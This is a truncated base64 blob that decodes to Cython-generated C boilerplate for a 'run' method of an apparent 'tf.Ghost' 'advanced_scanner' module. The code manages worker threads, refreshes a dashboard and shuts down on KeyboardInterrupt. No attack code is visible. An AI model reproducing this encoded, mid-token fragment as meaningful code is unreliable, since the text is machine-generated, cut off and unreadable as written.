TksIF9fcHl4X0wxM19lcnJvcikKICAgICAgICAgICAgICAgIF9fUHl4X0RFQ1JFRihfX3B5eF90XzIwKTsgX19weXhfdF8yMCA9IDA7CiAgICAgICAgICAgICAgICBpZiAoX19weXhfdF8xOCkgewogICAgICAgICAgICAgICAgICBfX1B5eF9JTkNSRUYoX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X2Nscyk7CiAgICAgICAgICAgICAgICAgIF9fcHl4X3RfMSA9IF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV9jbHM7CiAgICAgICAgICAgICAgICB9IGVsc2UgewogICAgICAgICAgICAgICAgICBfX1B5eF9JTkNSRUYoX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X2NsZWFyKTsKICAgICAgICAgICAgICAgICAgX19weXhfdF8xID0gX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X2NsZWFyOwogICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgX19weXhfdF81ID0gMTsKICAgICAgICAgICAgICAgICNpZiBDWVRIT05fVU5QQUNLX01FVEhPRFMKICAgICAgICAgICAgICAgIGlmICh1bmxpa2VseShQeU1ldGhvZF9DaGVjayhfX3B5eF90XzIpKSkgewogICAgICAgICAgICAgICAgICBfX3B5eF90XzMgPSBQeU1ldGhvZF9HRVRfU0VMRihfX3B5eF90XzIpOwogICAgICAgICAgICAgICAgICBhc3NlcnQoX19weXhfdF8zKTsKICAgICAgICAgICAgICAgICAgUHlPYmplY3QqIF9fcHl4X19mdW5jdGlvbiA9IFB5TWV0aG9kX0dFVF9GVU5DVElPTihfX3B5eF90XzIpOwogICAgICAgICAgICAgICAgICBfX1B5eF9JTkNSRUYoX19weXhfdF8zKTsKICAgICAgICAgICAgICAgICAgX19QeXhfSU5DUkVGKF9fcHl4X19mdW5jdGlvbik7CiAgICAgICAgICAgICAgICAgIF9fUHl4X0RFQ1JFRl9TRVQoX19weXhfdF8yLCBfX3B5eF9fZnVuY3Rpb24pOwogICAgICAgICAgICAgICAgICBfX3B5eF90XzUgPSAwOwogICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgI2VuZGlmCiAgICAgICAgICAgICAgICB7CiAgICAgICAgICAgICAgICAgIFB5T2JqZWN0ICpfX3B5eF9jYWxsYXJnc1syXSA9IHtfX3B5eF90XzMsIF9fcHl4X3RfMX07CiAgICAgICAgICAgICAgICAgIF9fcHl4X3RfNCA9IF9fUHl4X1B5T2JqZWN0X0Zhc3RDYWxsKF9fcHl4X3RfMiwgX19weXhfY2FsbGFyZ3MrX19weXhfdF81LCAoMi1fX3B5eF90XzUpIHwgKF9fcHl4X3RfNSpfX1B5eF9QWV9WRUNUT1JDQUxMX0FSR1VNRU5UU19PRkZTRVQpKTsKICAgICAgICAgICAgICAgICAgX19QeXhfWERFQ1JFRihfX3B5eF90XzMpOyBfX3B5eF90XzMgPSAwOwogICAgICAgICAgICAgICAgICBfX1B5eF9ERUNSRUYoX19weXhfdF8xKTsgX19weXhfdF8xID0gMDsKICAgICAgICAgICAgICAgICAgX19QeXhfREVDUkVGKF9fcHl4X3RfMik7IF9fcHl4X3RfMiA9IDA7CiAgICAgICAgICAgICAgICAgIGlmICh1bmxpa2VseSghX19weXhfdF80KSkgX19QWVhfRVJSKDAsIDQ1OSwgX19weXhfTDEzX2Vycm9yKQogICAgICAgICAgICAgICAgICBfX1B5eF9HT1RSRUYoX19weXhfdF80KTsKICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgIF9fUHl4X0RFQ1JFRihfX3B5eF90XzQpOyBfX3B5eF90XzQgPSAwOwoKICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgX19weXhfdF8yID0gX19weXhfdl9zZWxmOwogICAgICAgICAgICAgICAgX19QeXhfSU5DUkVGKF9fcHl4X3RfMik7CiAgICAgICAgICAgICAgICBfX3B5eF90XzUgPSAwOwogICAgICAgICAgICAgICAgewogICAgICAgICAgICAgICAgICBQeU9iamVjdCAqX19weXhfY2FsbGFyZ3NbMl0gPSB7X19weXhfdF8yLCBOVUxMfTsKICAgICAgICAgICAgICAgICAgX19weXhfdF80ID0gX19QeXhfUHlPYmplY3RfRmFzdENhbGxNZXRob2QoX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X2NyZWF0ZV9kYXNoYm9hcmQsIF9fcHl4X2NhbGxhcmdzK19fcHl4X3RfNSwgKDEtX19weXhfdF81KSB8ICgxKl9fUHl4X1BZX1ZFQ1RPUkNBTExfQVJHVU1FTlRTX09GRlNFVCkpOwogICAgICAgICAgICAgICAgICBfX1B5eF9YREVDUkVGKF9fcHl4X3RfMik7IF9fcHl4X3RfMiA9IDA7CiAgICAgICAgICAgICAgICAgIGlmICh1bmxpa2VseSghX19weXhfdF80KSkgX19QWVhfRVJSKDAsIDQ2MCwgX19weXhfTDEzX2Vycm9yKQogICAgICAgICAgICAgICAgICBfX1B5eF9HT1RSRUYoX19weXhfdF80KTsKICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgIF9fUHl4X0RFQ1JFRihfX3B5eF90XzQpOyBfX3B5eF90XzQgPSAwOwoKICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgX19weXhfdF8yID0gTlVMTDsKICAgICAgICAgICAgICAgIF9fUHl4X0dldE1vZHVsZUdsb2JhbE5hbWUoX19weXhfdF8xLCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3VfdGltZSk7IGlmICh1bmxpa2VseSghX19weXhfdF8xKSkgX19QWVhfRVJSKDAsIDQ2MiwgX19weXhfTDEzX2Vycm9yKQogICAgICAgICAgICAgICAgX19QeXhfR09UUkVGKF9fcHl4X3RfMSk7CiAgICAgICAgICAgICAgICBfX3B5eF90XzMgPSBfX1B5eF9QeU9iamVjdF9HZXRBdHRyU3RyKF9fcHl4X3RfMSwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X3NsZWVwKTsgaWYgKHVubGlrZWx5KCFfX3B5eF90XzMpKSBfX1BZWF9FUlIoMCwgNDYyLCBfX3B5eF9MMTNfZXJyb3IpCiAgICAgICAgICAgICAgICBfX1B5eF9HT1RSRUYoX19weXhfdF8zKTsKICAgICAgICAgICAgICAgIF9fUHl4X0RFQ1JFRihfX3B5eF90XzEpOyBfX3B5eF90XzEgPSAwOwogICAgICAgICAgICAgICAgX19weXhfdF81ID0gMTsKICAgICAgICAgICAgICAgICNpZiBDWVRIT05fVU5QQUNLX01FVEhPRFMKICAgICAgICAgICAgICAgIGlmICh1bmxpa2VseShQeU1ldGhvZF9DaGVjayhfX3B5eF90XzMpKSkgewogICAgICAgICAgICAgICAgICBfX3B5eF90XzIgPSBQeU1ldGhvZF9HRVRfU0VMRihfX3B5eF90XzMpOwogICAgICAgICAgICAgICAgICBhc3NlcnQoX19weXhfdF8yKTsKICAgICAgICAgICAgICAgICAgUHlPYmplY3QqIF9fcHl4X19mdW5jdGlvbiA9IFB5TWV0aG9kX0dFVF9GVU5DVElPTihfX3B5eF90XzMpOwogICAgICAgICAgICAgICAgICBfX1B5eF9JTkNSRUYoX19weXhfdF8yKTsKICAgICAgICAgICAgICAgICAgX19QeXhfSU5DUkVGKF9fcHl4X19mdW5jdGlvbik7CiAgICAgICAgICAgICAgICAgIF9fUHl4X0RFQ1JFRl9TRVQoX19weXhfdF8zLCBfX3B5eF9fZnVuY3Rpb24pOwogICAgICAgICAgICAgICAgICBfX3B5eF90XzUgPSAwOwogICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgI2VuZGlmCiAgICAgICAgICAgICAgICB7CiAgICAgICAgICAgICAgICAgIFB5T2JqZWN0ICpfX3B5eF9jYWxsYXJnc1syXSA9IHtfX3B5eF90XzIsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X2ludF8xfTsKICAgICAgICAgICAgICAgICAgX19weXhfdF80ID0gX19QeXhfUHlPYmplY3RfRmFzdENhbGwoX19weXhfdF8zLCBfX3B5eF9jYWxsYXJncytfX3B5eF90XzUsICgyLV9fcHl4X3RfNSkgfCAoX19weXhfdF81Kl9fUHl4X1BZX1ZFQ1RPUkNBTExfQVJHVU1FTlRTX09GRlNFVCkpOwogICAgICAgICAgICAgICAgICBfX1B5eF9YREVDUkVGKF9fcHl4X3RfMik7IF9fcHl4X3RfMiA9IDA7CiAgICAgICAgICAgICAgICAgIF9fUHl4X0RFQ1JFRihfX3B5eF90XzMpOyBfX3B5eF90XzMgPSAwOwogICAgICAgICAgICAgICAgICBpZiAodW5saWtlbHkoIV9fcHl4X3RfNCkpIF9fUFlYX0VSUigwLCA0NjIsIF9fcHl4X0wxM19lcnJvcikKICAgICAgICAgICAgICAgICAgX19QeXhfR09UUkVGKF9fcHl4X3RfNCk7CiAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICBfX1B5eF9ERUNSRUYoX19weXhfdF80KTsgX19weXhfdF80ID0gMDsKICAgICAgICAgICAgICB9CgogICAgICAgICAgICAgIAogICAgICAgICAgICB9CiAgICAgICAgICAgIF9fUHl4X1hERUNSRUYoX19weXhfdF8xMCk7IF9fcHl4X3RfMTAgPSAwOwogICAgICAgICAgICBfX1B5eF9YREVDUkVGKF9fcHl4X3RfMTEpOyBfX3B5eF90XzExID0gMDsKICAgICAgICAgICAgX19QeXhfWERFQ1JFRihfX3B5eF90XzEyKTsgX19weXhfdF8xMiA9IDA7CiAgICAgICAgICAgIGdvdG8gX19weXhfTDE4X3RyeV9lbmQ7CiAgICAgICAgICAgIF9fcHl4X0wxM19lcnJvcjo7CiAgICAgICAgICAgIF9fUHl4X1hERUNSRUYoX19weXhfdF8xKTsgX19weXhfdF8xID0gMDsKICAgICAgICAgICAgX19QeXhfWERFQ1JFRihfX3B5eF90XzE5KTsgX19weXhfdF8xOSA9IDA7CiAgICAgICAgICAgIF9fUHl4X1hERUNSRUYoX19weXhfdF8yKTsgX19weXhfdF8yID0gMDsKICAgICAgICAgICAgX19QeXhfWERFQ1JFRihfX3B5eF90XzIwKTsgX19weXhfdF8yMCA9IDA7CiAgICAgICAgICAgIF9fUHl4X1hERUNSRUYoX19weXhfdF8zKTsgX19weXhfdF8zID0gMDsKICAgICAgICAgICAgX19QeXhfWERFQ1JFRihfX3B5eF90XzQpOyBfX3B5eF90XzQgPSAwOwoKICAgICAgICAgICAgCiAgICAgICAgICAgIF9fcHl4X3RfMTYgPSBfX1B5eF9QeUVycl9FeGNlcHRpb25NYXRjaGVzKF9fcHl4X2J1aWx0aW5fS2V5Ym9hcmRJbnRlcnJ1cHQpOwogICAgICAgICAgICBpZiAoX19weXhfdF8xNikgewogICAgICAgICAgICAgIF9fUHl4X0FkZFRyYWNlYmFjaygidGYuR2hvc3QuYWR2YW5jZWRfc2Nhbm5lciIsIF9fcHl4X2NsaW5lbm8sIF9fcHl4X2xpbmVubywgX19weXhfZmlsZW5hbWUpOwogICAgICAgICAgICAgIGlmIChfX1B5eF9HZXRFeGNlcHRpb24oJl9fcHl4X3RfNCwgJl9fcHl4X3RfMywgJl9fcHl4X3RfMikgPCAwKSBfX1BZWF9FUlIoMCwgNDY0LCBfX3B5eF9MMTVfZXhjZXB0X2Vycm9yKQogICAgICAgICAgICAgIF9fUHl4X1hHT1RSRUYoX19weXhfdF80KTsKICAgICAgICAgICAgICBfX1B5eF9YR09UUkVGKF9fcHl4X3RfMyk7CiAgICAgICAgICAgICAgX19QeXhfWEdPVFJFRihfX3B5eF90XzIpOwoKICAgICAgICAgICAgICAKICAgICAgICAgICAgICBpZiAoX19QeXhfUHlPYmplY3RfU2V0QXR0clN0cihfX3B5eF92X3NlbGYsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV9ydW5uaW5nLCBQeV9GYWxzZSkgPCAoMCkpIF9fUFlYX0VSUigwLCA0NjUsIF9fcHl4X0wxNV9leGNlcHRfZXJyb3IpCgogICAgICAgICAgICAgIAogICAgICAgICAgICAgIF9fcHl4X3RfMjAgPSBOVUxMOwogICAgICAgICAgICAgIF9fUHl4X0lOQ1JFRihfX3B5eF9idWlsdGluX3ByaW50KTsKICAgICAgICAgICAgICBfX3B5eF90XzE5ID0gX19weXhfYnVpbHRpbl9wcmludDsgCiAgICAgICAgICAgICAgX19weXhfdF81ID0gMTsKICAgICAgICAgICAgICB7CiAgICAgICAgICAgICAgICBQeU9iamVjdCAqX19weXhfY2FsbGFyZ3NbMl0gPSB7X19weXhfdF8yMCwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfa3BfdV99OwogICAgICAgICAgICAgICAgX19weXhfdF8xID0gX19QeXhfUHlPYmplY3RfRmFzdENhbGwoX19weXhfdF8xOSwgX19weXhfY2FsbGFyZ3MrX19weXhfdF81LCAoMi1fX3B5eF90XzUpIHwgKF9fcHl4X3RfNSpfX1B5eF9QWV9WRUNUT1JDQUxMX0FSR1VNRU5UU19PRkZTRVQpKTsKICAgICAgICAgICAgICAgIF9fUHl4X1hERUNSRUYoX19weXhfdF8yMCk7IF9fcHl4X3RfMjAgPSAwOwogICAgICAgICAgICAgICAgX19QeXhfREVDUkVGKF9fcHl4X3RfMTkpOyBfX3B5eF90XzE5ID0gMDsKICAgICAgICAgICAgICAgIGlmICh1bmxpa2VseSghX19weXhfdF8xKSkgX19QWVhfRVJSKDAsIDQ2NiwgX19weXhfTDE1X2V4Y2VwdF9lcnJvcikKICAgICAgICAgICAgICAgIF9fUHl4X0dPVFJFRihfX3B5eF90XzEpOwogICAgICAgICAgICAgIH0KICAgICAgICAgICAgICBfX1B5eF9ERUNSRUYoX19weXhfdF8xKTsgX19weXhfdF8xID0gMDsKCiAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgX19weXhfdF8xOSA9IF9fcHl4X3ZfZXhlY3V0b3I7CiAgICAgICAgICAgICAgX19QeXhfSU5DUkVGKF9fcHl4X3RfMTkpOwogICAgICAgICAgICAgIF9fcHl4X3RfNSA9IDA7CiAgICAgICAgICAgICAgewogICAgICAgICAgICAgICAgUHlPYmplY3QgKl9fcHl4X2NhbGxhcmdzWzIgKyAoKENZVEhPTl9WRUNUT1JDQUxMKSA/IDEgOiAwKV0gPSB7X19weXhfdF8xOSwgTlVMTH07CiAgICAgICAgICAgICAgICBfX3B5eF90XzIwID0gX19QeXhfTWFrZVZlY3RvcmNhbGxCdWlsZGVyS3dkcygxKTsgaWYgKHVubGlrZWx5KCFfX3B5eF90XzIwKSkgX19QWVhfRVJSKDAsIDQ2NywgX19weXhfTDE1X2V4Y2VwdF9lcnJvcikKICAgICAgICAgICAgICAgIF9fUHl4X0dPVFJFRihfX3B5eF90XzIwKTsKICAgICAgICAgICAgICAgIGlmIChfX1B5eF9WZWN0b3JjYWxsQnVpbGRlcl9BZGRBcmcoX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X3dhaXQsIFB5X0ZhbHNlLCBfX3B5eF90XzIwLCBfX3B5eF9jYWxsYXJncysxLCAwKSA8ICgwKSkgX19QWVhfRVJSKDAsIDQ2NywgX19weXhfTDE1X2V4Y2VwdF9lcnJvcikKICAgICAgICAgICAgICAgIF9fcHl4X3RfMSA9IF9fUHl4X09iamVjdF9WZWN0b3JjYWxsTWV0aG9kX0NhbGxGcm9tQnVpbGRlcihfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3Vfc2h1dGRvd24sIF9fcHl4X2NhbGxhcmdzK19fcHl4X3RfNSwgKDEtX19weXhfdF81KSB8ICgxKl9fUHl4X1BZX1ZFQ1RPUkNBTExfQVJHVU1FTlRTX09GRlNFVCksIF9fcHl4X3RfMjApOwogICAgICAgICAgICAgICAgX19QeXhfWERFQ1JFRihfX3B5eF90XzE5KTsgX19weXhfdF8xOSA9IDA7CiAgICAgICAgICAgICAgICBfX1B5eF9ERUNSRUYoX19weXhfdF8yMCk7IF9fcHl4X3RfMjAgPSAwOwogICAgICAgICAgICAgICAgaWYgKHVubGlrZWx5KCFfX3B5eF90XzEpKSBfX1BZWF9FUlIoMCwgNDY3LCBfX3B5eF9MMTVfZXhjZXB0X2Vycm9yKQogICAgICAgICAgICAgICAgX19QeXhfR09UUkVGKF9fcHl4X3RfMSk7CiAgICAgICAgICAgICAgfQogICAgICAgICAgICAgIF9fUHl4X0RFQ1JFRihfX3B5eF90XzEpOyBfX3B5eF90XzEgPSAwOwogICAgICAgICAgICAgIF9fUHl4X1hERUNSRUYoX19weXhfdF80KTsgX19weXhfdF80ID0gMDsKICAgICAgICAgICAgICBfX1B5eF9YREVDUkVGKF9fcHl4X3RfMyk7IF9fcHl4X3RfMyA9IDA7CiAgICAgICAgICAgICAgX19QeXhfWERFQ1JFRihfX3B5eF90XzIpOyBfX3B5eF90XzIgPSAwOwogICAgICAgICAgICAgIGdvdG8gX19weXhfTDE0X2V4Y2VwdGlvbl9oYW5kbGVkOwogICAgICAgICAgICB9CiAgICAgICAgICAgIGdvdG8gX19weXhfTDE1X2V4Y2VwdF9lcnJvcjsKCiAgICAgICAgICAgIAogICAgICAgICAgICBfX3B5eF9MMTVfZXhjZXB0X2Vycm9yOjsKICAgICAgICAgICAgX19QeXhfWEdJVkVSRUYoX19weXhfdF8xMCk7CiAgICAgICAgICAgIF9fUHl4X1hHSVZFUkVGKF9fcHl4X3RfMTEpOwogICAgICAgICAgICBfX1B5eF9YR0lWRVJFRihfX3B5eF90XzEyKTsKICAgICAgICAgICAgX19QeXhfRXhjZXB0aW9uUmVzZXQoX19weXhfdF8xMCwgX19weXhfdF8xMSwgX19weXhfdF8xMik7CiAgICAgICAgICAgIGdvdG8gX19weXhfTDdfZXJyb3I7CiAgICAgICAgICAgIF9fcHl4X0wxNF9leGNlcHRpb25faGFuZGxlZDo7CiAgICAgICAgICAgIF9fUHl4X1hHSVZFUkVGKF9fcHl4X3RfMTApOwogICAgICAgICAgICBfX1B5eF9YR0lWRVJFRihfX3B5eF90XzExKTsKICAgICAgICAgICAgX19QeXhfWEdJVkVSRUYoX19weXhfdF8xMik7CiAgICAgICAgICAgIF9fUHl4X0V4Y2VwdGlvblJlc2V0KF9fcHl4X3RfMTAsIF9fcHl4X3RfMTEsIF9fcHl4X3RfMTIpOwogICAgICAgICAgICBfX3B5eF9MMThfdHJ5X2VuZDo7CiAgICAgICAgICB9CgogICAgICAgICAgCiAgICAgICAgfQogICAgICAgIF9fUHl4X1hERUNSRUYoX19weXhfdF83KTsgX19weXhfdF83ID0gMDsKICAgICAgICBfX1B5eF9YREVDUkVGKF9fcHl4X3RfOCk7IF9fcHl4X3RfOCA9IDA7CiAgICAgICAgX19QeXhfWERFQ1JFRihfX3B5eF90XzkpOyBfX3B5eF90XzkgPSAwOwogICAgICAgIGdvdG8gX19weXhfTDEyX3RyeV9lbmQ7CiAgICAgICAgX19weXhfTDdfZXJyb3I6OwogICAgICAgIF9fUHl4X1hERUNSRUYoX19weXhfdF8xKTsgX19weXhfdF8xID0gMDsKICAgICAgICBfX1B5eF9YREVDUkVGKF9fcHl4X3RfMTkpOyBfX3B5eF90XzE5ID0gMDsKICAgICAgICBfX1B5eF9YREVDUkVGKF9fcHl4X3RfMik7IF9fcHl4X3RfMiA9IDA7CiAgICAgICAgX19QeXhfWERFQ1JFRihfX3B5eF90XzIwKTsgX19weXhfdF8yMCA9IDA7CiAgICAgICAgX19QeXhfWERFQ1JFRihfX3B5eF90XzMpOyBfX3B5eF90XzMgPSAwOwogICAgICAgIF9fUHl4X1hERUNSRUYoX19weXhfdF80KTsgX19weXhfdF80ID0gMDsKICAgICAgICAgewogICAgICAgICAgX19QeXhfQWRkVHJhY2ViYWNrKCJ0Zi5HaG9zdC5hZHZhbmNlZF9zY2FubmVyIiwgX19weXhfY2xpbmVubywgX19weXhfbGluZW5vLCBfX3B5eF9maWxlbmFtZSk7CiAgICAgICAgICBpZiAoX19QeXhfR2V0RXhjZXB0aW9uKCZfX3B5eF90XzIsICZfX3B5eF90XzMsICZfX3B5eF90XzQpIDwgMCkgX19QWVhfRVJSKDAsIDQzOCwgX19weXhfTDlfZXhjZXB0X2Vycm9yKQogICAgICAgICAgX19QeXhfWEdPVFJFRihfX3B5eF90XzIpOwogICAgICAgICAgX19QeXhfWEdPVFJFRihfX3B5eF90XzMpOwogICAgICAgICAgX19QeXhfWEdPVFJFRihfX3B5eF90XzQpOwogICAgICAgICAgX19weXhfdF8xID0gUHlUdXBsZV9QYWNrKDMsIF9fcHl4X3RfMiwgX19weXhfdF8zLCBfX3B5eF90XzQpOyBpZiAodW5saWtlbHkoIV9fcHl4X3RfMSkpIF9fUFlYX0VSUigwLCA0MzgsIF9fcHl4X0w5X2V4Y2VwdF9lcnJvcikKICAgICAgICAgIF9fUHl4X0dPVFJFRihfX3B5eF90XzEpOwogICAgICAgICAgX19weXhfdF8xMiA9IF9fUHl4X1B5T2JqZWN0X0NhbGwoX19weXhfdF82LCBfX3B5eF90XzEsIE5VTEwpOwogICAgICAgICAgX19QeXhfREVDUkVGKF9fcHl4X3RfNik7IF9fcHl4X3RfNiA9IDA7CiAgICAgICAgICBfX1B5eF9ERUNSRUYoX19weXhfdF8xKTsgX19weXhfdF8xID0gMDsKICAgICAgICAgIGlmICh1bmxpa2VseSghX19weXhfdF8xMikpIF9fUFlYX0VSUigwLCA0MzgsIF9fcHl4X0w5X2V4Y2VwdF9lcnJvcikKICAgICAgICAgIF9fUHl4X0dPVFJFRihfX3B5eF90XzEyKTsKICAgICAgICAgIF9fcHl4X3RfMTggPSBfX1B5eF9QeU9iamVjdF9Jc1RydWUoX19weXhfdF8xMik7CiAgICAgICAgICBfX1B5eF9ERUNSRUYoX19weXhfdF8xMik7IF9fcHl4X3RfMTIgPSAwOwogICAgICAgICAgaWYgKF9fcHl4X3RfMTggPCAoMCkpIF9fUFlYX0VSUigwLCA0MzgsIF9fcHl4X0w5X2V4Y2VwdF9lcnJvcikKICAgICAgICAgIF9fcHl4X3RfMTMgPSAoIV9fcHl4X3RfMTgpOwogICAgICAgICAgaWYgKHVubGlrZWx5KF9fcHl4X3RfMTMpKSB7CiAgICAgICAgICAgIF9fUHl4X0dJVkVSRUYoX19weXhfdF8yKTsKICAgICAgICAgICAgX19QeXhfR0lWRVJFRihfX3B5eF90XzMpOwogICAgICAgICAgICBfX1B5eF9YR0lWRVJFRihfX3B5eF90XzQpOwogICAgICAgICAgICBfX1B5eF9FcnJSZXN0b3JlV2l0aFN0YXRlKF9fcHl4X3RfMiwgX19weXhfdF8zLCBfX3B5eF90XzQpOwogICAgICAgICAgICBfX3B5eF90XzIgPSAwOyAgX19weXhfdF8zID0gMDsgIF9fcHl4X3RfNCA9IDA7IAogICAgICAgICAgICBfX1BZWF9FUlIoMCwgNDM4LCBfX3B5eF9MOV9leGNlcHRfZXJyb3IpCiAgICAgICAgICB9CiAgICAgICAgICBfX1B5eF9YREVDUkVGKF9fcHl4X3RfMik7IF9fcHl4X3RfMiA9IDA7CiAgICAgICAgICBfX1B5eF9YREVDUkVGKF9fcHl4X3RfMyk7IF9fcHl4X3RfMyA9IDA7CiAgICAgICAgICBfX1B5eF9YREVDUkVGKF9fcHl4X3RfNCk7IF9fcHl4X3RfNCA9IDA7CiAgICAgICAgICBnb3RvIF9fcHl4X0w4X2V4Y2VwdGlvbl9oYW5kbGVkOwogICAgICAgIH0KICAgICAgICBfX3B5eF9MOV9leGNlcHRfZXJyb3I6OwogICAgICAgIF9fUHl4X1hHSVZFUkVGKF9fcHl4X3RfNyk7CiAgICAgICAgX19QeXhfWEdJVkVSRUYoX19weXhfdF84KTsKICAgICAgICBfX1B5eF9YR0lWRVJFRihfX3B5eF90XzkpOwogICAgICAgIF9fUHl4X0V4Y2VwdGlvblJlc2V0KF9fcHl4X3RfNywgX19weXhfdF84LCBfX3B5eF90XzkpOwogICAgICAgIGdvdG8gX19weXhfTDFfZXJyb3I7CiAgICAgICAgX19weXhfTDhfZXhjZXB0aW9uX2hhbmRsZWQ6OwogICAgICAgIF9fUHl4X1hHSVZFUkVGKF9fcHl4X3RfNyk7CiAgICAgICAgX19QeXhfWEdJVkVSRUYoX19weXhfdF84KTsKICAgICAgICBfX1B5eF9YR0lWRVJFRihfX3B5eF90XzkpOwogICAgICAgIF9fUHl4X0V4Y2VwdGlvblJlc2V0KF9fcHl4X3RfNywgX19weXhfdF84LCBfX3B5eF90XzkpOwogICAgICAgIF9fcHl4X0wxMl90cnlfZW5kOjsKICAgICAgfQogICAgfQogICAgIHsKICAgICAgewogICAgICAgIGlmIChfX3B5eF90XzYpIHsKICAgICAgICAgIF9fcHl4X3RfOSA9IF9fUHl4X1B5T2JqZWN0X0NhbGwoX19weXhfdF82LCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF90dXBsZVswXSwgTlVMTCk7CiAgICAgICAgICBfX1B5eF9ERUNSRUYoX19weXhfdF82KTsgX19weXhfdF82ID0gMDsKICAgICAgICAgIGlmICh1bmxpa2VseSghX19weXhfdF85KSkgX19QWVhfRVJSKDAsIDQzOCwgX19weXhfTDFfZXJyb3IpCiAgICAgICAgICBfX1B5eF9HT1RSRUYoX19weXhfdF85KTsKICAgICAgICAgIF9fUHl4X0RFQ1JFRihfX3B5eF90XzkpOyBfX3B5eF90XzkgPSAwOwogICAgICAgIH0KICAgICAgICBnb3RvIF9fcHl4X0w2OwogICAgICB9CiAgICAgIF9fcHl4X0w2OjsKICAgIH0KICAgIGdvdG8gX19weXhfTDM1OwogICAgX19weXhfTDNfZXJyb3I6OwogICAgX19QeXhfREVDUkVGKF9fcHl4X3RfNik7IF9fcHl4X3RfNiA9IDA7CiAgICBnb3RvIF9fcHl4X0wxX2Vycm9yOwogICAgX19weXhfTDM1OjsKICB9CgogIAoKICAKICBfX3B5eF9yID0gUHlfTm9uZTsgX19QeXhfSU5DUkVGKFB5X05vbmUpOwogIGdvdG8gX19weXhfTDA7CiAgX19weXhfTDFfZXJyb3I6OwogIF9fUHl4X1hERUNSRUYoX19weXhfdF8xKTsKICBfX1B5eF9YREVDUkVGKF9fcHl4X3RfMik7CiAgX19QeXhfWERFQ1JFRihfX3B5eF90XzMpOwogIF9fUHl4X1hERUNSRUYoX19weXhfdF80KTsKICBfX1B5eF9YREVDUkVGKF9fcHl4X3RfMTkpOwogIF9fUHl4X1hERUNSRUYoX19weXhfdF8yMCk7CiAgX19QeXhfQWRkVHJhY2ViYWNrKCJ0Zi5HaG9zdC5hZHZhbmNlZF9zY2FubmVyIiwgX19weXhfY2xpbmVubywgX19weXhfbGluZW5vLCBfX3B5eF9maWxlbmFtZSk7CiAgX19weXhfciA9IE5VTEw7CiAgX19weXhfTDA6OwogIF9fUHl4X1hERUNSRUYoX19weXhfdl9leGVjdXRvcik7CiAgX19QeXhfWERFQ1JFRihfX3B5eF92X2Z1dHVyZV90b193b3JrZXIpOwogIF9fUHl4X1hERUNSRUYoX19weXhfdl93b3JrZXJfaWQpOwogIF9fUHl4X1hERUNSRUYoX19weXhfdl9hY3RpdmVfd29ya2Vycyk7CiAgX19QeXhfWERFQ1JFRihfX3B5eF92X2Z1dHVyZSk7CiAgX19QeXhfWERFQ1JFRihfX3B5eF9nYl8ydGZfNUdob3N0XzE2YWR2YW5jZWRfc2Nhbm5lcl8yZ2VuZXJhdG9yMyk7CiAgX19QeXhfWERFQ1JFRihfX3B5eF84Z2VuZXhwcjRfX3B5eF92X3dpZCk7CiAgX19QeXhfWERFQ1JFRihfX3B5eF84Z2VuZXhwcjRfX3B5eF92X2Z1dHVyZSk7CiAgX19QeXhfWEdJVkVSRUYoX19weXhfcik7CiAgX19QeXhfUmVmTmFubnlGaW5pc2hDb250ZXh0KCk7CiAgcmV0dXJuIF9fcHl4X3I7Cn0KCgoKCnN0YXRpYyBQeU9iamVjdCAqX19weXhfcHdfMnRmXzVHaG9zdF8zMXJ1bihQeU9iamVjdCAqX19weXhfc2VsZiwgCiNpZiBDWVRIT05fTUVUSF9GQVNUQ0FMTApQeU9iamVjdCAqY29uc3QgKl9fcHl4X2FyZ3MsIFB5X3NzaXplX3QgX19weXhfbmFyZ3MsIFB5T2JqZWN0ICpfX3B5eF9rd2RzCiNlbHNlClB5T2JqZWN0ICpfX3B5eF9hcmdzLCBQeU9iamVjdCAqX19weXhfa3dkcwojZW5kaWYKKTsgCnN0YXRpYyBQeU1ldGhvZERlZiBfX3B5eF9tZGVmXzJ0Zl81R2hvc3RfMzFydW4gPSB7InJ1biIsIChQeUNGdW5jdGlvbikodm9pZCgqKSh2b2lkKSkoX19QeXhfUHlDRnVuY3Rpb25fRmFzdENhbGxXaXRoS2V5d29yZHMpX19weXhfcHdfMnRmXzVHaG9zdF8zMXJ1biwgX19QeXhfTUVUSF9GQVNUQ0FMTHxNRVRIX0tFWVdPUkRTLCAwfTsKc3RhdGljIFB5T2JqZWN0ICpfX3B5eF9wd18ydGZfNUdob3N0XzMxcnVuKFB5T2JqZWN0ICpfX3B5eF9zZWxmLCAKI2lmIENZVEhPTl9NRVRIX0ZBU1RDQUxMClB5T2JqZWN0ICpjb25zdCAqX19weXhfYXJncywgUHlfc3NpemVfdCBfX3B5eF9uYXJncywgUHlPYmplY3QgKl9fcHl4X2t3ZHMKI2Vsc2UKUHlPYmplY3QgKl9fcHl4X2FyZ3MsIFB5T2JqZWN0ICpfX3B5eF9rd2RzCiNlbmRpZgopIHsKICBQeU9iamVjdCAqX19weXhfdl9zZWxmID0gMDsKICAjaWYgIUNZVEhPTl9NRVRIX0ZBU1RDQUxMCiAgQ1lUSE9OX1VOVVNFRCBQeV9zc2l6ZV90IF9fcHl4X25hcmdzOwogICNlbmRpZgogIENZVEhPTl9VTlVTRUQgUHlPYmplY3QgKmNvbnN0ICpfX